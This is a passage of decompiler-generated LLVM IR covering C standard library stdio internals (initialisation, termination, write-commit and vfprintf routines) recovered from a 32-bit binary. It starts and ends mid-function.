  %v1_8050236 = trunc i32 %v2_8050234 to i16
  %v3_8050236 = inttoptr i32 %v1_805022b to i16*
  store i16 %v1_8050236, i16* %v3_8050236, align 2
  %v0_805023a = load i32, i32* %stack_var_-76, align 4
  %v1_805023a = call i32 @__errno_location(i32 %v0_805023a)
  store i32 %v1_805023a, i32* %eax.global-to-local, align 4
  store i32 %v1_805023a, i32* @esi, align 4
  %v1_8050244 = inttoptr i32 %v1_805023a to i32*
  %v2_8050244 = load i32, i32* %v1_8050244, align 4
  store i32 %v2_8050244, i32* @edi, align 4
  %v0_8050246 = load i32, i32* @ebp, align 4
  %v1_8050246 = add i32 %v0_8050246, 4
  %v2_8050246 = inttoptr i32 %v1_8050246 to i32*
  %v3_8050246 = load i32, i32* %v2_8050246, align 4
  store i32 %v3_8050246, i32* %stack_var_-76, align 4
  %v1_8050249 = call i32 @isatty(i32 %v3_8050246)
  %v2_8050251 = mul i32 %v1_8050249, 256
  store i32 %v2_8050251, i32* %eax.global-to-local, align 4
  %v0_8050254 = load i32, i32* @ebx, align 4
  %v2_8050254 = or i32 %v0_8050254, %v2_8050251
  store i32 %v2_8050254, i32* @ebx, align 4
  %v1_8050256 = trunc i32 %v2_8050254 to i16
  %v2_8050256 = load i32, i32* @ebp, align 4
  %v3_8050256 = inttoptr i32 %v2_8050256 to i16*
  store i16 %v1_8050256, i16* %v3_8050256, align 2
  %v0_805025a = load i32, i32* @edi, align 4
  %v1_805025a = load i32, i32* @esi, align 4
  %v2_805025a = inttoptr i32 %v1_805025a to i32*
  store i32 %v0_805025a, i32* %v2_805025a, align 4
  %v0_805025c = load i32, i32* @ebp, align 4
  %v1_805025c = add i32 %v0_805025c, 8
  %v2_805025c = inttoptr i32 %v1_805025c to i32*
  %v3_805025c = load i32, i32* %v2_805025c, align 4
  %v4_805025c = icmp eq i32 %v3_805025c, 0
  %v1_8050260 = icmp eq i1 %v4_805025c, false
  br i1 %v1_8050260, label %dec_label_pc_8050290, label %dec_label_pc_8050262

dec_label_pc_8050262:                             ; preds = %dec_label_pc_805021a
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_805026a = call i32 @malloc(i32 4096)
  store i32 %v1_805026a, i32* %eax.global-to-local, align 4
  %v1_8050272 = load i32, i32* @ebp, align 4
  %v2_8050272 = add i32 %v1_8050272, 8
  %v3_8050272 = inttoptr i32 %v2_8050272 to i32*
  store i32 %v1_805026a, i32* %v3_8050272, align 4
  %v1_8050275 = icmp eq i32 %v1_805026a, 0
  %v0_8050289 = load i32, i32* @ebp, align 4
  br i1 %v1_8050275, label %dec_label_pc_8050289, label %dec_label_pc_8050279

dec_label_pc_8050279:                             ; preds = %dec_label_pc_8050262
  %v1_8050279 = inttoptr i32 %v0_8050289 to i16*
  %v2_8050279 = load i16, i16* %v1_8050279, align 2
  %v3_8050279 = or i16 %v2_8050279, 16384
  store i16 %v3_8050279, i16* %v1_8050279, align 2
  %v1_805027f = add i32 %v1_805026a, 4096
  store i32 %v1_805027f, i32* %eax.global-to-local, align 4
  %v1_8050284 = load i32, i32* @ebp, align 4
  %v2_8050284 = add i32 %v1_8050284, 12
  %v3_8050284 = inttoptr i32 %v2_8050284 to i32*
  store i32 %v1_805027f, i32* %v3_8050284, align 4
  br label %dec_label_pc_8050290

dec_label_pc_8050289:                             ; preds = %dec_label_pc_8050262
  %v1_8050289 = add i32 %v0_8050289, 12
  %v2_8050289 = inttoptr i32 %v1_8050289 to i32*
  store i32 0, i32* %v2_8050289, align 4
  br label %dec_label_pc_8050290

dec_label_pc_8050290:                             ; preds = %dec_label_pc_805021a, %dec_label_pc_8050279, %dec_label_pc_8050289
  %v0_8050290 = load i32, i32* @ebp, align 4
  %v1_8050290 = add i32 %v0_8050290, 8
  %v2_8050290 = inttoptr i32 %v1_8050290 to i32*
  %v3_8050290 = load i32, i32* %v2_8050290, align 4
  store i32 %v3_8050290, i32* %eax.global-to-local, align 4
  %v1_8050293 = add i32 %v0_8050290, 2
  %v2_8050293 = inttoptr i32 %v1_8050293 to i8*
  store i8 0, i8* %v2_8050293, align 1
  %v0_8050297 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050297 = load i32, i32* @ebp, align 4
  %v2_8050297 = add i32 %v1_8050297, 24
  %v3_8050297 = inttoptr i32 %v2_8050297 to i32*
  store i32 %v0_8050297, i32* %v3_8050297, align 4
  %v0_805029a = load i32, i32* %eax.global-to-local, align 4
  %v1_805029a = load i32, i32* @ebp, align 4
  %v2_805029a = add i32 %v1_805029a, 28
  %v3_805029a = inttoptr i32 %v2_805029a to i32*
  store i32 %v0_805029a, i32* %v3_805029a, align 4
  %v0_805029d = load i32, i32* %eax.global-to-local, align 4
  %v1_805029d = load i32, i32* @ebp, align 4
  %v2_805029d = add i32 %v1_805029d, 16
  %v3_805029d = inttoptr i32 %v2_805029d to i32*
  store i32 %v0_805029d, i32* %v3_805029d, align 4
  %v0_80502a0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80502a0 = load i32, i32* @ebp, align 4
  %v2_80502a0 = add i32 %v1_80502a0, 20
  %v3_80502a0 = inttoptr i32 %v2_80502a0 to i32*
  store i32 %v0_80502a0, i32* %v3_80502a0, align 4
  %v0_80502a3 = load i32, i32* @ebp, align 4
  %v1_80502a3 = add i32 %v0_80502a3, 44
  %v2_80502a3 = inttoptr i32 %v1_80502a3 to i32*
  store i32 0, i32* %v2_80502a3, align 4
  %v0_80502aa = load i32, i32* @ebp, align 4
  %v1_80502aa = add i32 %v0_80502aa, 1
  %v2_80502aa = inttoptr i32 %v1_80502aa to i8*
  %v3_80502aa = load i8, i8* %v2_80502aa, align 1
  %v4_80502aa = and i8 %v3_80502aa, 32
  %v5_80502aa = icmp eq i8 %v4_80502aa, 0
  %v0_80502ae = load i32, i32* @global_var_8061320.704, align 32
  store i32 %v0_80502ae, i32* @eax, align 4
  %v2_80502b3 = add i32 %v0_80502aa, 52
  %v3_80502b3 = inttoptr i32 %v2_80502b3 to i32*
  store i32 %v0_80502ae, i32* %v3_80502b3, align 4
  br i1 %v5_80502aa, label %dec_label_pc_8050325, label %dec_label_pc_80502b8

dec_label_pc_80502b8:                             ; preds = %dec_label_pc_8050290
  %v2_80502c3 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80502c3, i32* %stack_var_-76, align 4
  %v2_80502c8 = call i32 @__pthread_return_void(i32 %v2_80502c3, i32 134560279)
  store i32 %v2_80502c8, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8061308.701 to i32), i32* %stack_var_-76, align 4
  %v1_80502d4 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8061308.701 to i32))
  store i32 %v1_80502d4, i32* @eax, align 4
  %v2_80502e6 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_80502e6, i32* %stack_var_-76, align 4
  %v2_80502eb = call i32 @__pthread_return_void(i32 %v2_80502e6, i32 134560279)
  store i32 %v2_80502eb, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80612f0.705 to i32), i32* %stack_var_-76, align 4
  %v1_80502f7 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80612f0.705 to i32))
  %v0_80502fc = load i32, i32* bitcast (i32** @global_var_80612ec.706 to i32*), align 4
  store i32 %v0_80502fc, i32* @eax, align 4
  %v1_8050301 = load i32, i32* @ebp, align 4
  %v2_8050301 = add i32 %v1_8050301, 32
  %v3_8050301 = inttoptr i32 %v2_8050301 to i32*
  store i32 %v0_80502fc, i32* %v3_8050301, align 4
  %v0_8050304 = load i32, i32* @ebp, align 4
  store i32 %v0_8050304, i32* bitcast (i32** @global_var_80612ec.706 to i32*), align 4
  %v2_805030a = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_805030a, i32* @ecx, align 4
  store i32 %v2_80502e6, i32* %stack_var_-76, align 4
  %v2_805030f = call i32 @__pthread_return_void(i32 %v2_80502e6, i32 1)
  store i32 %v2_80502e6, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_80502c3, i32* %stack_var_-76, align 4
  %v2_8050319 = call i32 @__pthread_return_void(i32 %v2_80502c3, i32 1)
  store i32 %v2_8050319, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805031e

dec_label_pc_805031e:                             ; preds = %dec_label_pc_805014b, %dec_label_pc_80502b8
  br label %dec_label_pc_8050325

dec_label_pc_8050323:                             ; preds = %dec_label_pc_8050141, %dec_label_pc_805012e
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8050325

dec_label_pc_8050325:                             ; preds = %dec_label_pc_8050290, %dec_label_pc_805017a, %dec_label_pc_805031e, %dec_label_pc_8050323
  %v0_8050328 = load i32, i32* @ebp, align 4
  store i32 %v0_8050328, i32* %eax.global-to-local, align 4
  %v2_805032a = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805032a, i32* @ebx, align 4
  store i32 %v0_8050102, i32* @esi, align 4
  store i32 %v0_8050101, i32* @edi, align 4
  store i32 %v0_8050100, i32* @ebp, align 4
  ret i32 %v0_8050328

; uselistorder directives
  uselistorder i32 %v2_80502e6, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_80502c3, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8050289, { 1, 0 }
  uselistorder i32 %v1_805026a, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8050251, { 1, 0 }
  uselistorder i32 %v1_805023a, { 1, 0, 2 }
  uselistorder i32 %v11_80501fc, { 1, 0 }
  uselistorder i32 %v0_8050205.pre, { 1, 0 }
  uselistorder i32 %v1_80501cd, { 1, 0 }
  uselistorder i32 %v0_80501c9, { 1, 0 }
  uselistorder i32 %v1_80501be, { 1, 0, 2 }
  uselistorder i32 %v1_805017f, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_805016e, { 1, 0 }
  uselistorder i32 %v0_8050141, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29 }
  uselistorder i32 577, { 0, 2, 1 }
  uselistorder i32 %arg4, { 3, 1, 0, 4, 2, 5 }
  uselistorder label %dec_label_pc_8050325, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_805031e, { 1, 0 }
  uselistorder label %dec_label_pc_8050290, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80501ff, { 1, 0 }
  uselistorder label %dec_label_pc_80501ef, { 1, 0 }
  uselistorder label %dec_label_pc_80501ac, { 1, 0 }
  uselistorder label %dec_label_pc_8050176, { 1, 0 }
  uselistorder label %dec_label_pc_8050168, { 1, 0 }
  uselistorder label %dec_label_pc_805015d, { 2, 0, 1 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050331 = load i32, i32* @edi, align 4
  %v0_8050332 = load i32, i32* @esi, align 4
  %v0_8050333 = load i32, i32* @ebx, align 4
  store i32 %v0_8050333, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_805033c = call i32 @__errno_location(i32 %v0_8050333)
  store i32 %v1_805033c, i32* @edi, align 4
  %v0_8050346 = load i32, i32* @global_var_8061340.697, align 64
  store i32 %v0_8050346, i32* @esi, align 4
  %v1_805034c = inttoptr i32 %v1_805033c to i32*
  %v2_805034c = load i32, i32* %v1_805034c, align 4
  store i32 %v2_805034c, i32* %ebp.global-to-local, align 4
  %v1_8050350 = call i32 @isatty(i32 0)
  %v0_8050355 = load i32, i32* @ebx, align 4
  %v2_8050357 = sub i32 %v0_8050355, %v1_8050350
  %v2_8050362 = mul i32 %v2_8050357, 256
  %v0_8050365 = load i32, i32* @esi, align 4
  %v2_8050365 = xor i32 %v0_8050365, %v2_8050362
  %v1_8050367 = trunc i32 %v2_8050365 to i16
  store i16 %v1_8050367, i16* bitcast (i32* @global_var_8061340.697 to i16*), align 64
  %v0_805036e = load i32, i32* @global_var_8061390.698, align 16
  store i32 %v0_805036e, i32* @esi, align 4
  %v1_8050374 = call i32 @isatty(i32 1)
  %v0_8050379 = load i32, i32* @ebx, align 4
  %v2_8050379 = sub i32 %v0_8050379, %v1_8050374
  %v2_805037b = mul i32 %v2_8050379, 256
  %v0_805037e = load i32, i32* @esi, align 4
  %v2_805037e = xor i32 %v2_805037b, %v0_805037e
  %v1_8050380 = trunc i32 %v2_805037e to i16
  store i16 %v1_8050380, i16* bitcast (i32* @global_var_8061390.698 to i16*), align 16
  %v0_8050387 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8050387 = load i32, i32* @edi, align 4
  %v2_8050387 = inttoptr i32 %v1_8050387 to i32*
  store i32 %v0_8050387, i32* %v2_8050387, align 4
  %v2_805038c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805038c, i32* @ebx, align 4
  store i32 %v0_8050332, i32* @esi, align 4
  store i32 %v0_8050331, i32* @edi, align 4
  ret i32 %v1_8050374

; uselistorder directives
  uselistorder i32 %v1_805033c, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_805039f = inttoptr i32 %arg1 to i16*
  %v4_805039f = call i32 @memcpy(i16* %v3_805039f, i32 ptrtoint (i32* @global_var_805fc80.707 to i32), i32 24)
  ret i32 %v4_805039f
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80503a8 = load i32, i32* @esi, align 4
  %v0_80503a9 = load i32, i32* @ebx, align 4
  store i32 %v0_80503a9, i32* %stack_var_-8, align 4
  %v1_80503b2 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_80612f0.705 to i32))
  store i32 %v1_80503b2, i32* %eax.global-to-local, align 4
  %v1_80503be = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_8061308.701 to i32))
  store i32 %v1_80503be, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_80612ec.706 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_805040822 = icmp eq i32 %storemerge21, 0
  %v1_805040a23 = icmp eq i1 %v1_805040822, false
  br i1 %v1_805040a23, label %dec_label_pc_80503cb.lr.ph, label %dec_label_pc_8050428.preheader

dec_label_pc_80503cb.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_80503cb

dec_label_pc_80503cb:                             ; preds = %dec_label_pc_80503cb.lr.ph, %dec_label_pc_80503f2
  %storemerge24 = phi i32 [ %storemerge21, %dec_label_pc_80503cb.lr.ph ], [ %storemerge, %dec_label_pc_80503f2 ]
  %v1_80503ce = add i32 %storemerge24, 56
  store i32 %v1_80503ce, i32* @esi, align 4
  %v1_80503d2 = call i32 @__pthread_return_0(i32 %v1_80503ce)
  store i32 %v1_80503d2, i32* %eax.global-to-local, align 4
  %v1_80503da = icmp eq i32 %v1_80503d2, 0
  br i1 %v1_80503da, label %dec_label_pc_80503f2, label %dec_label_pc_80503de

dec_label_pc_80503de:                             ; preds = %dec_label_pc_80503cb
  %v0_80503de = load i32, i32* %ebx.global-to-local, align 4
  %v1_80503de = add i32 %v0_80503de, 8
  %v2_80503de = inttoptr i32 %v1_80503de to i32*
  %v3_80503de = load i32, i32* %v2_80503de, align 4
  store i32 %v3_80503de, i32* %eax.global-to-local, align 4
  %v1_80503e1 = inttoptr i32 %v0_80503de to i16*
  store i16 48, i16* %v1_80503e1, align 2
  %v0_80503e6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80503e6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80503e6 = add i32 %v1_80503e6, 24
  %v3_80503e6 = inttoptr i32 %v2_80503e6 to i32*
  store i32 %v0_80503e6, i32* %v3_80503e6, align 4
  %v0_80503e9 = load i32, i32* %eax.global-to-local, align 4
  %v1_80503e9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80503e9 = add i32 %v1_80503e9, 28
  %v3_80503e9 = inttoptr i32 %v2_80503e9 to i32*
  store i32 %v0_80503e9, i32* %v3_80503e9, align 4
  %v0_80503ec = load i32, i32* %eax.global-to-local, align 4
  %v1_80503ec = load i32, i32* %ebx.global-to-local, align 4
  %v2_80503ec = add i32 %v1_80503ec, 16
  %v3_80503ec = inttoptr i32 %v2_80503ec to i32*
  store i32 %v0_80503ec, i32* %v3_80503ec, align 4
  %v0_80503ef = load i32, i32* %eax.global-to-local, align 4
  %v1_80503ef = load i32, i32* %ebx.global-to-local, align 4
  %v2_80503ef = add i32 %v1_80503ef, 20
  %v3_80503ef = inttoptr i32 %v2_80503ef to i32*
  store i32 %v0_80503ef, i32* %v3_80503ef, align 4
  br label %dec_label_pc_80503f2

dec_label_pc_80503f2:                             ; preds = %dec_label_pc_80503cb, %dec_label_pc_80503de
  %v0_80503f5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80503f5 = add i32 %v0_80503f5, 52
  %v2_80503f5 = inttoptr i32 %v1_80503f5 to i32*
  store i32 1, i32* %v2_80503f5, align 4
  %v0_80503fc = load i32, i32* @esi, align 4
  %v1_80503fd = call i32 @__stdio_init_mutex(i32 %v0_80503fc)
  store i32 %v1_80503fd, i32* %eax.global-to-local, align 4
  %v0_8050402 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050402 = add i32 %v0_8050402, 32
  %v2_8050402 = inttoptr i32 %v1_8050402 to i32*
  %storemerge = load i32, i32* %v2_8050402, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_8050408 = icmp eq i32 %storemerge, 0
  %v1_805040a = icmp eq i1 %v1_8050408, false
  br i1 %v1_805040a, label %dec_label_pc_80503cb, label %dec_label_pc_8050405.dec_label_pc_8050428.preheader_crit_edge

dec_label_pc_8050405.dec_label_pc_8050428.preheader_crit_edge: ; preds = %dec_label_pc_80503f2
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_80612ec.706 to i32*), align 4
  br label %dec_label_pc_8050428.preheader

dec_label_pc_8050428.preheader:                   ; preds = %dec_label_pc_8050405.dec_label_pc_8050428.preheader_crit_edge, %entry
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_8050405.dec_label_pc_8050428.preheader_crit_edge ], [ %storemerge21, %entry ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_80504283 = icmp eq i32 %storemerge12, 0
  %v1_805042a10 = icmp eq i1 %v1_80504283, false
  br i1 %v1_805042a10, label %dec_label_pc_8050414.preheader, label %dec_label_pc_805042c

dec_label_pc_8050414.preheader:                   ; preds = %dec_label_pc_8050428.preheader
  br label %dec_label_pc_8050414

dec_label_pc_8050414:                             ; preds = %dec_label_pc_8050414.preheader, %dec_label_pc_8050425
  %v0_805041c = phi i32 [ %storemerge1, %dec_label_pc_8050425 ], [ %storemerge12, %dec_label_pc_8050414.preheader ]
  %v1_8050414 = inttoptr i32 %v0_805041c to i8*
  %v2_8050414 = load i8, i8* %v1_8050414, align 1
  %v3_8050414 = and i8 %v2_8050414, 64
  %v4_8050414 = icmp eq i8 %v3_8050414, 0
  br i1 %v4_8050414, label %dec_label_pc_8050425, label %dec_label_pc_8050419

dec_label_pc_8050419:                             ; preds = %dec_label_pc_8050414
  %v1_805041d = call i32 @__stdio_wcommit(i32 %v0_805041c)
  store i32 %v1_805041d, i32* %eax.global-to-local, align 4
  %v0_8050425.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050425

dec_label_pc_8050425:                             ; preds = %dec_label_pc_8050414, %dec_label_pc_8050419
  %v0_8050425 = phi i32 [ %v0_805041c, %dec_label_pc_8050414 ], [ %v0_8050425.pre, %dec_label_pc_8050419 ]
  %v1_8050425 = add i32 %v0_8050425, 32
  %v2_8050425 = inttoptr i32 %v1_8050425 to i32*
  %storemerge1 = load i32, i32* %v2_8050425, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_8050428 = icmp eq i32 %storemerge1, 0
  %v1_805042a = icmp eq i1 %v1_8050428, false
  br i1 %v1_805042a, label %dec_label_pc_8050414, label %dec_label_pc_805042c

dec_label_pc_805042c:                             ; preds = %dec_label_pc_8050425, %dec_label_pc_8050428.preheader
  %v2_805042c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805042c, i32* %eax.global-to-local, align 4
  %v2_805042d = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805042d, i32* @ebx, align 4
  store i32 %v0_80503a8, i32* @esi, align 4
  ret i32 %v2_805042c

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %ebx.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_8050425, { 1, 0 }
  uselistorder label %dec_label_pc_8050414, { 1, 0 }
  uselistorder label %dec_label_pc_80503f2, { 1, 0 }
  uselistorder label %dec_label_pc_80503cb, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_8050430 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8050438 = add i32 %arg1, 8
  %v2_8050438 = inttoptr i32 %v1_8050438 to i32*
  %v3_8050438 = load i32, i32* %v2_8050438, align 4
  store i32 %v3_8050438, i32* %edx.global-to-local, align 4
  %v1_805043b = add i32 %arg1, 16
  %v2_805043b = inttoptr i32 %v1_805043b to i32*
  %v3_805043b = load i32, i32* %v2_805043b, align 4
  %v2_805043e = sub i32 %v3_805043b, %v3_8050438
  %v12_805043e = icmp eq i32 %v2_805043e, 0
  store i32 %v2_805043e, i32* %eax.global-to-local, align 4
  br i1 %v12_805043e, label %dec_label_pc_8050451, label %dec_label_pc_8050442

dec_label_pc_8050442:                             ; preds = %entry
  store i32 %v3_8050438, i32* %v2_805043b, align 4
  %v0_8050445 = load i32, i32* @ecx, align 4
  %v0_8050446 = load i32, i32* %eax.global-to-local, align 4
  %v0_8050447 = load i32, i32* %edx.global-to-local, align 4
  %v0_8050448 = load i32, i32* @ebx, align 4
  %v4_8050449 = inttoptr i32 %v0_8050448 to i16*
  %v5_8050449 = call i32 @__stdio_WRITE(i16* %v4_8050449, i32 %v0_8050447, i32 %v0_8050446, i32 %v0_8050445)
  store i32 %v5_8050449, i32* %eax.global-to-local, align 4
  %v0_8050451.pre = load i32, i32* @ebx, align 4
  %v2_8050457.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8050451

dec_label_pc_8050451:                             ; preds = %entry, %dec_label_pc_8050442
  %v2_8050457 = phi i32 [ %tmp11, %entry ], [ %v2_8050457.pre, %dec_label_pc_8050442 ]
  %v0_8050451 = phi i32 [ %arg1, %entry ], [ %v0_8050451.pre, %dec_label_pc_8050442 ]
  %v1_8050451 = add i32 %v0_8050451, 16
  %v2_8050451 = inttoptr i32 %v1_8050451 to i32*
  %v3_8050451 = load i32, i32* %v2_8050451, align 4
  store i32 %v3_8050451, i32* %eax.global-to-local, align 4
  %v2_8050454 = add i32 %v0_8050451, 8
  %v3_8050454 = inttoptr i32 %v2_8050454 to i32*
  %v4_8050454 = load i32, i32* %v3_8050454, align 4
  %v5_8050454 = sub i32 %v3_8050451, %v4_8050454
  store i32 %v5_8050454, i32* %eax.global-to-local, align 4
  store i32 %v2_8050457, i32* @edx, align 4
  store i32 %v0_8050430, i32* @ebx, align 4
  ret i32 %v5_8050454

; uselistorder directives
  uselistorder i32 %v0_8050451, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8050451, { 1, 0 }
}

define i32 @__GI_vfprintf(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v12_805045f = ptrtoint i32* %stack_var_-28 to i32
  %v4_8050462 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8050462, i32* @esi, align 4
  %v1_8050466 = add i32 %v4_8050462, 52
  %v2_8050466 = inttoptr i32 %v1_8050466 to i32*
  %v3_8050466 = load i32, i32* %v2_8050466, align 4
  store i32 %v3_8050466, i32* @edi, align 4
  %v1_8050469 = icmp eq i32 %v3_8050466, 0
  %v1_805046b = icmp eq i1 %v1_8050469, false
  br i1 %v1_805046b, label %dec_label_pc_805048c, label %dec_label_pc_805046d

dec_label_pc_805046d:                             ; preds = %entry
  %v1_805046d = add i32 %v4_8050462, 56
  store i32 %v1_805046d, i32* @ebx, align 4
  store i32 %v12_805045f, i32* @eax, align 4
  %v3_805047c = call i32 @__pthread_return_void(i32 %v12_805045f, i32 134560279)
  %v0_8050481 = load i32, i32* @ebx, align 4
  %v2_8050484 = call i32 @__pthread_return_0(i32 %v0_8050481)
  %v0_805048c.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805048c

dec_label_pc_805048c:                             ; preds = %entry, %dec_label_pc_805046d
  %v0_80504a2 = phi i32 [ %v4_8050462, %entry ], [ %v0_805048c.pre, %dec_label_pc_805046d ]
  %v1_805048c = inttoptr i32 %v0_80504a2 to i16*
  %v2_805048c = load i16, i16* %v1_805048c, align 2
  %v1_805048f = and i16 %v2_805048c, 192
  %v6_8050494 = icmp eq i16 %v1_805048f, 192
  br i1 %v6_8050494, label %dec_label_pc_805048c.dec_label_pc_80504b2_crit_edge, label %dec_label_pc_805049b

dec_label_pc_805048c.dec_label_pc_80504b2_crit_edge: ; preds = %dec_label_pc_805048c
  br label %dec_label_pc_80504b2

dec_label_pc_805049b:                             ; preds = %dec_label_pc_805048c
  %v0_805049b = load i32, i32* @ecx, align 4
  %v6_80504a3 = call i32 @__stdio_trans2w_o(i16* %v1_805048c, i32 128, i32 %v0_805049b, i32 %v0_805049b)
  store i32 -1, i32* @ebx, align 4
  %v1_80504ae = icmp eq i32 %v6_80504a3, 0
  %v1_80504b0 = icmp eq i1 %v1_80504ae, false
  br i1 %v1_80504b0, label %dec_label_pc_80504c6, label %dec_label_pc_805049b.dec_label_pc_80504b2_crit_edge

dec_label_pc_805049b.dec_label_pc_80504b2_crit_edge: ; preds = %dec_label_pc_805049b
  %v0_80504bb.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80504b2

dec_label_pc_80504b2:                             ; preds = %dec_label_pc_805048c.dec_label_pc_80504b2_crit_edge, %dec_label_pc_805049b.dec_label_pc_80504b2_crit_edge
  %v0_80504bb = phi i32 [ %v0_80504a2, %dec_label_pc_805048c.dec_label_pc_80504b2_crit_edge ], [ %v0_80504bb.pre, %dec_label_pc_805049b.dec_label_pc_80504b2_crit_edge ]
  %v0_80504b2 = load i32, i32* @edx, align 4
  %v5_80504bc = inttoptr i32 %arg2 to i8*
  %v6_80504bc = call i32 @_vfprintf_internal(i32 %v0_80504bb, i8* %v5_80504bc, i32 %arg3, i32 %v0_80504b2)
  store i32 %v6_80504bc, i32* @ebx, align 4
  br label %dec_label_pc_80504c6

dec_label_pc_80504c6:                             ; preds = %dec_label_pc_805049b, %dec_label_pc_80504b2
  %v0_80504de7 = phi i32 [ -1, %dec_label_pc_805049b ], [ %v6_80504bc, %dec_label_pc_80504b2 ]
  br i1 %v1_805046b, label %dec_label_pc_80504db, label %dec_label_pc_80504ca

dec_label_pc_80504ca:                             ; preds = %dec_label_pc_80504c6
  store i32 %v12_805045f, i32* @eax, align 4
  %v3_80504d3 = call i32 @__pthread_return_void(i32 %v12_805045f, i32 1)
  %v0_80504de.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80504db

dec_label_pc_80504db:                             ; preds = %dec_label_pc_80504c6, %dec_label_pc_80504ca
  %v0_80504de = phi i32 [ %v0_80504de7, %dec_label_pc_80504c6 ], [ %v0_80504de.pre, %dec_label_pc_80504ca ]
  ret i32 %v0_80504de

; uselistorder directives
  uselistorder i32 %v12_805045f, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_80504db, { 1, 0 }
  uselistorder label %dec_label_pc_80504c6, { 1, 0 }
  uselistorder label %dec_label_pc_80504b2, { 1, 0 }
  uselistorder label %dec_label_pc_805048c, { 1, 0 }
}

define i32 @_charpad() local_unnamed_addr {
entry:
  %stack_var_-13 = alloca i32, align 4
  %v0_80504e4 = load i32, i32* @edi, align 4
  %v0_80504e5 = load i32, i32* @esi, align 4
  %v0_80504e6 = load i32, i32* @ebx, align 4
  %v0_80504e7 = load i32, i32* @eax, align 4
  store i32 %v0_80504e7, i32* @edi, align 4
  %v0_80504ec = load i32, i32* @ecx, align 4
  store i32 %v0_80504ec, i32* @esi, align 4
  store i32 %v0_80504ec, i32* @ebx, align 4
  %v0_80504f0 = load i32, i32* @edx, align 4
  store i32 %v0_80504f0, i32* %stack_var_-13, align 4
  %v1_80504f72 = icmp eq i32 %v0_80504ec, 0
  br i1 %v1_80504f72, label %dec_label_pc_805050f, label %dec_label_pc_80504fb.lr.ph

dec_label_pc_80504fb.lr.ph:                       ; preds = %entry
